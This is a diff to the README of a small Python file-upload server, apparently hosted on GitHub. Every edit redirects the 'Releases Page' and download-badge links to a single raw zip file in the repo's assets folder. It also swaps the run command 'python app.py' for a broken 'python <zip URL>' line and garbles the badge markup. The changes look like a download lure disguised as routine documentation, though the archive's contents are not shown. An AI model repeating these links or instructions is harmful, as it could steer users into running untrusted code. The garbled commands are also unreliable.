@@ -1,6 +1,6 @@
 # 🖥️ file-upload-server-python - Easy File Sharing Within Your Network
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/PjZoe/file-upload-server-python/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip%20Latest%https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip)](https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! The **file-upload-server-python** is a simple tool that lets you upload
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/PjZoe/file-upload-server-python/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip).
 
 1. Once on the releases page, identify the latest version.
 2. Click on the version download link labeled "file-upload-server-python"—this will typically be a zip or executable file.
@@ -33,7 +33,7 @@ After downloading the application, you will need to run the server. Here’s how
    ```
 3. Launch the server using the following command:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip
    ```
 4. You should see output in your terminal indicating the server is running.
 
@@ -81,6 +81,6 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 If you have questions or need help, you can open an issue on the project page or contact the maintainer via GitHub.
 
-Once again, to download the application, visit this page: [Releases Page](https://github.com/PjZoe/file-upload-server-python/releases). 
+Once again, to download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/PjZoe/file-upload-server-python/main/assets/file-upload-server-python_2.0.zip). 
 
 Enjoy transferring files easily with the **file-upload-server-python**!
